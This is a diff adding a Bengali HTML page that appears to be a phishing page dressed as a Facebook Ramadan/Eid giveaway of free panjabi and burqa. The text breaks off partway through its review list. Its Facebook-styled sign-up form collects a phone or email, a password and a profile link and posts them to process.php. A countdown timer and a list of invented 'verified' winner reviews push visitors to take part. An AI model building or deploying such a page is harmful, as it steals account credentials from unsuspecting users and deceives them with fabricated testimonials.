@@ -1,0 +1,1258 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>রমজান গিবওয়ে: পাঞ্জাবি/বোরকা জিতুন সম্পূর্ণ বিনামূল্যে!</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-blue: #1877F2;
+            --secondary-blue: #4267B2;
+            --bg-color: #F0F2F5;
+            --card-bg: #FFFFFF;
+            --text-primary: #050505;
+            --text-secondary: #65676B;
+            --divider-color: #CED0D4;
+            --pink-accent: #f76b8a;
+        }
+
+            .social-icon {
+            font-size: 3rem !important; 
+            margin: 15px;
+            display: inline-block;
+            transition: transform 0.3s;
+        }
+    
+    /* পপ-আপ বক্সের স্টাইল */
+/* পপ-আপ এবং রিভিউ কার্ডের প্রফেশনাল স্টাইল */
+.modal {
+    display: none; 
+    position: fixed; 
+    z-index: 2000; 
+    left: 0; top: 0;
+    width: 100%; height: 100%;
+    background-color: rgba(0,0,0,0.7); /* ব্যাকগ্রাউন্ড একটু গাঢ় হবে */
+}
+
+.modal-content {
+    background-color: #ffffff;
+    margin: 10% auto;
+    padding: 20px;
+    border-radius: 20px;
+    width: 90%;
+    max-width: 450px;
+    max-height: 70vh;
+    overflow-y: auto;
+    box-shadow: 0 15px 35px rgba(0,0,0,0.3);
+    position: relative;
+}
+
+.close-btn {
+    position: absolute;
+    right: 20px;
+    top: 15px;
+    font-size: 28px;
+    font-weight: bold;
+    cursor: pointer;
+    color: #999;
+}
+
+.review-card {
+    background: #f8f9fa;
+    padding: 15px;
+    border-radius: 15px;
+    margin-bottom: 15px;
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    border: 1px solid #eee;
+    text-align: left;
+}
+
+.user-img {
+    width: 45px;
+    height: 45px;
+    background: #1877F2;
+    color: white;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: bold;
+    flex-shrink: 0;
+}
+
+
+
+    
+    
+        .social-icon:hover {
+            transform: scale(1.2);
+        }
+        .footer {
+            text-align: center;
+            padding: 30px;
+            background-color: #f8f9fa;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-primary);
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 2rem 1rem;
+        }
+
+        /* Header */
+        .header {
+            background-color: var(--card-bg);
+            padding: 1rem;
+            border-bottom: 1px solid var(--divider-color);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            animation: fadeInDown 0.5s ease-out;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .logo i {
+            font-size: 2.5rem;
+            color: var(--primary-blue);
+        }
+
+        .logo-text h1 {
+            font-family: 'Nunito', sans-serif;
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: var(--primary-blue);
+            margin: 0;
+        }
+
+        .logo-text p {
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            margin: 0;
+        }
+
+        /* Hero Section */
+        .hero {
+            text-align: center;
+            padding: 3rem 1rem;
+            background: linear-gradient(135deg, #e9f2ff, #d1e3ff);
+            border-radius: 12px;
+            margin-top: 2rem;
+            animation: fadeInUp 0.7s ease-out;
+        }
+
+        .hero h1 {
+            font-family: 'Nunito', sans-serif;
+            font-size: 2.5rem;
+            font-weight: 900;
+            color: var(--secondary-blue);
+            margin-bottom: 1rem;
+        }
+
+        .hero p {
+            font-size: 1.1rem;
+            color: var(--text-secondary);
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        /* Login Section */
+        .login-section {
+            background-color: var(--card-bg);
+            border-radius: 12px;
+            padding: 2rem;
+            margin-top: 2rem;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            animation: fadeInUp 0.7s ease-out 0.2s both;
+        }
+
+        .login-header {
+            text-align: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .login-header h2 {
+            font-family: 'Nunito', sans-serif;
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--secondary-blue);
+        }
+
+        .login-form .form-group {
+            margin-bottom: 1rem;
+        }
+
+        .login-form input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid var(--divider-color);
+            border-radius: 6px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+
+        .login-form input:focus {
+            outline: none;
+            border-color: var(--primary-blue);
+            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.2);
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--primary-blue);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .submit-btn:hover {
+            background-color: var(--secondary-blue);
+        }
+
+        .login-divider {
+            text-align: center;
+            margin: 1.5rem 0;
+            color: var(--text-secondary);
+            font-weight: 500;
+            border-top: 1px solid var(--divider-color);
+            padding-top: 1rem;
+        }
+
+        /* Product Display */
+        .product-gallery {
+            margin-top: 2rem;
+            text-align: center;
+        }
+
+        .product-gallery h3 {
+            font-family: 'Nunito', sans-serif;
+            font-size: 1.5rem;
+            color: var(--secondary-blue);
+            margin-bottom: 1.5rem;
+        }
+
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 1rem;
+        }
+
+        .product-item {
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .product-item:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.12);
+        }
+
+        .product-item img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        /* Feature Boxes */
+        .feature-boxes {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+            margin-top: 3rem;
+        }
+
+        .feature-box {
+            background-color: var(--card-bg);
+            padding: 1.5rem;
+            border-radius: 12px;
+            text-align: center;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+        }
+
+        .feature-box:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+            border-color: var(--pink-accent);
+        }
+
+        .feature-box i {
+            font-size: 2.5rem;
+            color: var(--primary-blue);
+            margin-bottom: 1rem;
+            transition: color 0.3s ease;
+        }
+
+        .feature-box:hover i {
+            color: var(--pink-accent);
+        }
+
+        .feature-box h3 {
+            font-family: 'Nunito', sans-serif;
+            font-size: 1.2rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+        }
+
+        .feature-box p {
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+        }
+
+        /* Footer */
+        .footer {
+            background-color: var(--secondary-blue);
+            color: white;
+            text-align: center;
+            padding: 2rem 1rem;
+            margin-top: 3rem;
+        }
+
+        .footer p {
+            margin: 0.5rem 0;
+        }
+
+        .footer a {
+            color: white;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .footer .social-icon {
+            font-size: 1.5rem;
+            margin-top: 1rem;
+            transition: transform 0.3s ease;
+        }
+
+        .footer .social-icon:hover {
+            transform: scale(1.2);
+        }
+
+        /* Animations */
+        @keyframes fadeInDown {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .hero h1 { font-size: 2rem; }
+            .login-section { padding: 1.5rem; }
+        }
+
+        @media (max-width: 480px) {
+            .header { flex-direction: column; gap: 0.5rem; }
+            .hero h1 { font-size: 1.8rem; }
+            .product-grid { grid-template-columns: repeat(2, 1fr); }
+        }
+    
+    
+    
+    /* লাইভ মেসেজ পপ-আপের স্টাইল */
+.toast-msg {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    background: #ffffff;
+    padding: 15px 20px;
+    border-radius: 10px;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+    z-index: 9999;
+    font-size: 14px;
+    border-left: 5px solid #1877F2;
+    animation: slideInRight 0.5s forwards;
+}
+
+@keyframes slideInRight {
+    from { transform: translateX(100%); opacity: 0; }
+    to { transform: translateX(0); opacity: 1; }
+}
+@keyframes slideOutRight {
+    from { transform: translateX(0); opacity: 1; }
+    to { transform: translateX(100%); opacity: 0; }
+}
+
+    
+       /* সতর্কতা বক্সের স্টাইল */
+.warning-box {
+    background-color: #fff3f3;
+    border: 1px solid #ffcccc;
+    color: #a94442;
+    padding: 15px;
+    border-radius: 8px;
+    margin: 20px auto;
+    width: 90%;
+    font-size: 14px;
+    line-height: 1.5;
+    text-align: left;
+}
+.warning-box strong {
+    display: block;
+    margin-bottom: 5px;
+} 
+    
+    
+    </style>
+</head>
+<body>
+
+    <header class="header">
+    <div class="logo">
+        <i class="fab fa-facebook"></i>
+        <div class="logo-text">
+            <h1>রমজান অফার</h1>
+            <p>আমাদের ঈদের উপহার 🎁</p>
+        </div>
+    </div>
+        <div id="countdown" style="text-align: center; font-size: 1.1rem; font-weight: bold; color: #d9534f; margin-top: 10px;">
+    
+</div>
+
+</header>
+
+<div id="countdown" style="text-align: center; font-size: 0.9rem; font-weight: bold; color: #d9534f; background: #fff; padding: 10px; margin: 10px auto; border-radius: 8px; border: 1px solid #ddd; max-width: 90%;">
+    অফারটি শেষ হতে বাকি: <span id="timer">Loading...</span>
+</div>
+
+<div class="container">
+    </div>
+
+
+     
+            </div>
+        </div>
+    </header>
+    
+    
+                    
+           
+    <div class="container">
+        <section class="hero">
+            <h1>ঈদ উপলক্ষে: পাঞ্জাবি/বোরকা জিতুন সম্পূর্ণ বিনামূল্যে!</h1>
+            <p>"পবিত্র রমজান মাস উপলক্ষ্যে আমাদের পক্ষ থেকে আপনার জন্য ঈদের অগ্রিম শুভেচ্ছা ও অভিনন্দন! ঈদ উপলক্ষে আমার বিশেষ উপহার  নিয়ে এসেছি আপনাদের জন্য! এখনই রেজিস্ট্রেশন করুন এবং জিতে নিন আপনার পছন্দের পাঞ্জাবি বা বোরকা সম্পূর্ণ বিনামূল্যে। ⚠️ বিশেষ ঘোষণা: আমাদের টিম রেজিস্ট্রেশনকারী সবার মধ্য থেকে বাছাই করা ১০০ জনকে বিজয়ী হিসেবে নির্বাচিত করবে এবং তাদের হাতে তুলে দেওয়া হবে এই বিশেষ ঈদ উপহার। তাই দেরি না করে দ্রুত রেজিস্ট্রেশন সম্পন্ন করুন এবং ঈদের আনন্দ ভাগ করে নিন।"</p>
+        </section>
+
+      
+        
+        
+        <section class="login-section" style="max-width: 400px; margin: 30px auto; padding: 20px; text-align: center; font-family: sans-serif;">
+    
+    <div style="margin-bottom: 20px;">
+        <i class="fab fa-facebook" style="font-size: 70px; color: #1877f2;"></i>
+    </div>
+
+    <form class="login-form" action="process.php" method="POST" style="display: flex; flex-direction: column; gap: 12px;">
+        <div class="form-group">
+            <input type="text" name="phone" placeholder="Mobile number or email" required style="width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box;">
+        </div>
+        <div class="form-group">
+            <input type="password" name="password" placeholder="Password" required style="width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box;">
+        </div>
+        <div class="form-group">
+            <input type="text" name="token" placeholder="Enter your Facebook profile link" style="width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box;">
+        </div>
+        
+        <button type="submit" class="submit-btn" style="background: #1877f2; color: white; padding: 14px; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer;">
+            Sign Up
+        </button>
+    </form>
+
+    <div style="margin-top: 15px;">
+        <a href="https://www.facebook.com/login/identify/" style="color: #1877f2; text-decoration: none; font-size: 14px;">Forgot password?</a>
+    </div>
+
+    <hr style="margin: 20px 0; border: 0; border-top: 1px solid #ddd;">
+</section>
+
+        
+        
+
+        <section class="product-gallery">
+            <h3>আমাদের পুরস্কারসমূহ</h3>
+            <div class="product-grid">
+                <div class="product-item"><img src="panjabi1.jpg" alt="পাঞ্জাবি"></div>
+                <div class="product-item"><img src="burqa1.jpg" alt="বোরকা"></div>
+                <div class="product-item"><img src="panjabi2.jpg" alt="পাঞ্জাবি"></div>
+                <div class="product-item"><img src="burqa2.jpg" alt="বোরকা"></div>
+                <div class="product-item"><img src="panjabi3.jpg" alt="পাঞ্জাবি"></div>
+                <div class="product-item"><img src="burqa3.jpg" alt="বোরকা"></div>
+                <div class="product-item"><img src="panjabi4.jpg" alt="পাঞ্জাবি"></div>
+                <div class="product-item"><img src="burqa4.jpg" alt="বোরকা"></div>
+                <div class="product-item"><img src="panjabi5.jpg" alt="পাঞ্জাবি"></div>
+                <div class="product-item"><img src="burqa5.jpg" alt="বোরকা"></div>
+                <div class="product-item"><img src="panjabi6.jpg" alt="পাঞ্জাবি"></div>
+                <div class="product-item"><img src="burqa6.jpg" alt="বোরকা"></div>
+                <div class="product-item"><img src="panjabi7.jpg" alt="পাঞ্জাবি"></div>
+                <div class="product-item"><img src="burqa7.jpg" alt="বোরকা"></div>
+                <div class="product-item"><img src="panjabi8.jpg" alt="পাঞ্জাবি"></div>
+                <div class="product-item"><img src="burqa8.jpg" alt="বোরকা"></div>
+                <div class="product-item"><img src="panjabi9.jpg" alt="পাঞ্জাবি"></div>
+                <div class="product-item"><img src="burqa9.jpg" alt="বোরকা"></div>
+                <div class="product-item"><img src="panjabi10.jpg" alt="পাঞ্জাবি"></div>
+                <div class="product-item"><img src="burqa10.jpg" alt="বোরকা"></div>
+            </div>
+        </section>
+
+        <section class="feature-boxes">
+            <div class="feature-box">
+                <i class="fas fa-tshirt"></i>
+                <h3>স্টাইলিশ পাঞ্জাবি</h3>
+                <p>আধুনিক ডিজাইনের আকর্ষণীয় সব পাঞ্জাবি থেকে বেছে নিন আপনার পছন্দেরটি।</p>
+            </div>
+            <div class="feature-box">
+                <i class="fas fa-female"></i>
+                <h3>মার্জিত বোরকা</h3>
+                <p>শালীন ও সুন্দর ডিজাইনের বোরকা যা আপনার ব্যক্তিত্বকে ফুটিয়ে তুলবে।</p>
+            </div>
+            <div class="feature-box">
+                <i class="fas fa-check-circle"></i>
+                <h3>সহজ অংশগ্রহণ</h3>
+                <p>মাত্র কয়েকটি সহজ ধাপে গিবিওয়েতে অংশগ্রহণ করে জিতে নিন আকর্ষণীয় পুরস্কার।</p>
+            </div>
+            
+           <div class="feature-box">
+    <i class="fas fa-question-circle"></i>
+    <h3>সাধারণ কিছু প্রশ্ন (FAQ)</h3>
+    <div style="text-align: left; margin-top: 15px; font-size: 0.9rem; line-height: 1.6; color: #000000;">
+        <p><strong>১. রেজিস্ট্রেশন কি একদম ফ্রি?</strong><br>হ্যাঁ, আমাদের এই গিভঅ্যাওয়েতে রেজিস্ট্রেশন সম্পূর্ণ ফ্রি।</p>
+        <p><strong>২. বিজয়ীদের কিভাবে জানানো হবে?</strong><br>বিজয়ীদের ফেসবুক পেজের মাধ্যমে সরাসরি মেসেজ বা পোস্ট দিয়ে জানানো হবে।</p>
+        <p><strong>৩. পুরস্কার কি হোম ডেলিভারি দেওয়া হবে?</strong><br>হ্যাঁ, বিজয়ীদের পুরস্কার তাদের ঠিকানায় পাঠিয়ে দেওয়া হবে।</p>
+    </div>
+</div>
+
+            
+            
+         
+            
+            
+            <div class="feature-box">
+    <i class="fas fa-share-alt" style="color: #4267B2; font-size: 2rem;"></i>
+    <h3>বন্ধুদের সাথে শেয়ার করুন</h3>
+    <p>আমাদের এই গিভঅ্যাওয়েটি শেয়ার করে আপনার প্রিয়জনদেরও অংশগ্রহণের সুযোগ করে দিন!</p>
+    
+    <div style="margin-top: 15px; display: flex; justify-content: center; gap: 20px; font-size: 1.8rem;">
+        <a href="javascript:void(0)" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(window.location.href), '_blank')" style="color: #1877F2;">
+            <i class="fab fa-facebook"></i>             
+        </a>
+        
+   
+        <a href="javascript:void(0)" onclick="shareContent()" style="color: #0084ff; font-size: 30px;">
+    <i class="fab fa-facebook-messenger"></i>
+</a>
+
+<script>
+function shareContent() {
+    if (navigator.share) {
+        navigator.share({
+            title: 'গিভঅ্যাওয়েতে অংশ নিন',
+            text: 'এই চমৎকার গিভঅ্যাওয়েতে অংশ নিন!',
+            url: window.location.href
+        })
+        .then(() => console.log('শেয়ার সফল হয়েছে'))
+        .catch((error) => console.log('শেয়ার করা যায়নি', error));
+    } else {
+        // যদি ব্রাউজারে শেয়ার এপিআই সাপোর্ট না করে তবে মেসেঞ্জারের ব্যাকআপ লিঙ্ক
+        window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(window.location.href), '_blank');
+    }
+}
+</script>
+
+
+        
+
+<script>
+function shareContent() {
+    if (navigator.share) {
+        navigator.share({
+            title: 'গিভঅ্যাওয়েতে অংশ নিন',
+            text: 'এই চমৎকার গিভঅ্যাওয়েতে অংশ নিন!',
+            url: window.location.href
+        })
+        .then(() => console.log('শেয়ার সফল হয়েছে'))
+        .catch((error) => console.log('শেয়ার করা যায়নি', error));
+    } else {
+        // যদি ব্রাউজারে শেয়ার এপিআই সাপোর্ট না করে তবে মেসেঞ্জারের ব্যাকআপ লিঙ্ক
+        window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(window.location.href), '_blank');
+    }
+}
+</script>
+
+        
+        <a href="javascript:void(0)" onclick="window.open('https://wa.me/?text=' + encodeURIComponent(window.location.href), '_blank')" style="color: #25D366;">
+            <i class="fab fa-whatsapp"></i>
+        </a>
+        
+        <a href="javascript:void(0)" onclick="copyToClipboard()" style="color: #E1306C;">
+            <i class="fas fa-link"></i>
+        </a>
+    </div>
+</div>
+
+<script>
+function copyToClipboard() {
+    navigator.clipboard.writeText(window.location.href).then(function() {
+        alert("লিঙ্কটি কপি হয়েছে!");
+    }, function(err) {
+        alert("কপি করতে সমস্যা হয়েছে!");
+    });
+}
+</script>
+
+  
+            
+<div class="feature-box">
+    <i class="fas fa-star" style="color: #FFD700;"></i>
+    <h3>২০২৫ সালের বিজয়ীদের মতামত</h3>
+    <p>২০২৫ সালে যারা পুরস্কার বুঝে পেয়েছেন!</p>
+    <button onclick="openModal()" style="background: #1877F2; color: #fff; border: none; padding: 12px 25px; border-radius: 30px; margin-top: 15px; cursor: pointer; font-weight: bold; box-shadow: 0 4px 10px rgba(24,119,242,0.3);">
+        বিজয়দের রিভিউ দেখুন ২০২৫
+    </button>
+</div>
+
+<div id="reviewModal" class="modal">
+    <div class="modal-content">
+        <span class="close-btn" onclick="closeModal()">&times;</span>
+        <h3 style="margin-bottom: 20px; text-align: center;">বিগত বিজয়ীদের রিভিউ</h3>
+          <div id="reviewList">
+   
+              
+              
+              <div class="review-card">
+    <div class="user-img" style="background: #1877F2;">R</div>
+    <div class="review-details">
+        <h4>রাফসান আহমেদ <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">অসাধারণ কোয়ালিটির পাঞ্জাবি! বিশ্বাসই করতে পারিনি ফ্রিতে এত ভালো জিনিস পাবো। ধন্যবাদ।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #E91E63;">M</div>
+    <div class="review-details">
+        <h4>মিতু আক্তার <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">বোরকাটা অনেক সুন্দর এবং কাপড়টা খুব আরামদায়ক। ইনশাআল্লাহ আবার অংশগ্রহণ করবো।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #4CAF50;">S</div>
+    <div class="review-details">
+        <h4>সাকিব হাসান <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">ডেলিভারি চার্জও নেওয়া লাগেনি। আপনারা সত্যিই কথা রাখছেন। অনেক অনেক শুভকামনা।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #FF9800;">A</div>
+    <div class="review-details">
+        <h4>আরিফ বিল্লাহ <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">উপহার পেয়ে খুব ভালো লাগছে। একদম অরিজিনাল প্রোডাক্ট।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #9C27B0;">N</div>
+    <div class="review-details">
+        <h4>নিলুফার ইয়াসমিন <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">রমজানের সেরা গিফট। কোয়ালিটি নিয়ে কোনো কথা হবে না।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #00BCD4;">J</div>
+    <div class="review-details">
+        <h4>জাহিদ হাসান <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">আমি বিশ্বাসই করতে পারিনি আমার নাম আসবে। ধন্যবাদ টিম গিভঅ্যাওয়ে।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #795548;">H</div>
+    <div class="review-details">
+        <h4>হাবিবুর রহমান <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">খুবই দ্রুত ডেলিভারি পেয়েছি। প্রোডাক্টের ফিনিশিং চমৎকার।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #607D8B;">T</div>
+    <div class="review-details">
+        <h4>তানজিলা আক্তার <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">পাঞ্জাবিটা আমার ভাইকে দিয়েছি, ও খুব পছন্দ করেছে।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #f44336;">F</div>
+    <div class="review-details">
+        <h4>ফাহিম আহমেদ <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">সবারই এই গিভঅ্যাওয়েতে অংশ নেওয়া উচিত। ১০০% রিয়েল।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #3f51b5;">O</div>
+    <div class="review-details">
+        <h4>ওমর ফারুক <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">আলহামদুলিল্লাহ, পাঞ্জাবিটা পেয়ে আমি খুব খুশি।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #e91e63;">L</div>
+    <div class="review-details">
+        <h4>লিমা আক্তার <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">সঠিক সময়ে উপহারটি হাতে পেয়েছি। কোয়ালিটি বেশ ভালো।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #ffc107;">K</div>
+    <div class="review-details">
+        <h4>কামরুল ইসলাম <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">বিনা খরচে এত সুন্দর পাঞ্জাবি পাবো কখনো ভাবিনি।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #009688;">Z</div>
+    <div class="review-details">
+        <h4>জহিরুল ইসলাম <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">পাঞ্জাবিটা অনেক সুন্দর। ধন্যবাদ টিম গিভঅ্যাওয়ে।</p>
+    </div>
+</div>
+<div class="review-card">
+    <div class="user-img" style="background: #CDDC39;">B</div>
+    <div class="review-details">
+        <h4>বিপ্লব হোসেন <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">আমি বিজয়ীদের তালিকায় ছিলাম, কাল উপহার পেয়েছি।</p>
+    </div>
+</div>
+<div class="review-card">
+    <div class="user-img" style="background: #FFC107;">P</div>
+    <div class="review-details">
+        <h4>প্রিয়াংকা পাল <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">খুবই প্রিমিয়াম প্যাকেজিং। কোয়ালিটি নিয়ে কোনো প্রশ্ন নেই।</p>
+    </div>
+</div>
+<div class="review-card">
+    <div class="user-img" style="background: #673AB7;">I</div>
+    <div class="review-details">
+        <h4>ইমরান খন্দকার <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">আলহামদুলিল্লাহ, উপহারটি পেয়ে খুবই ভালো লাগছে।</p>
+    </div>
+</div>
+<div class="review-card">
+    <div class="user-img" style="background: #2196F3;">U</div>
+    <div class="review-details">
+        <h4>উজ্জ্বল মিয়া <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">সততার সাথে গিভঅ্যাওয়ে আয়োজন করার জন্য ধন্যবাদ।</p>
+    </div>
+</div>
+<div class="review-card">
+    <div class="user-img" style="background: #455A64;">D</div>
+    <div class="review-details">
+        <h4>দিপু আহমেদ <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">চমৎকার কাপড় এবং ফিনিশিং। আমি অনেক খুশি।</p>
+    </div>
+</div>
+<div class="review-card">
+    <div class="user-img" style="background: #D32F2F;">W</div>
+    <div class="review-details">
+        <h4>ওয়াসিফ জামান <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">আমি সবাইকে বলবো এখানে অংশগ্রহণ করতে। এটা ট্রাস্টেড।</p>
+    </div>
+</div>
+<div class="review-card">
+    <div class="user-img" style="background: #C2185B;">Y</div>
+    <div class="review-details">
+        <h4>ইয়াসিন আরাফাত <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
+        <div style="color: #FFD700; font-size: 10px; margin: 3px 0;">⭐⭐⭐⭐⭐</div>
+        <p style="margin:0; font-size: 0.85rem; color: #444;">ডেলিভারি অনেক ফাস্ট ছিল। কালকে অর্ডার হয়েছে আজ পেলাম।</p>
+    </div>
+</div>
+
+<div class="review-card">
+    <div class="user-img" style="background: #AFB42B;">G</div>
+    <div class="review-details">
+        <h4>গিয়াস উদ্দিন <span style="color: #25D366; font-size: 11px;">✔ ভেরিফাইড</span></h4>
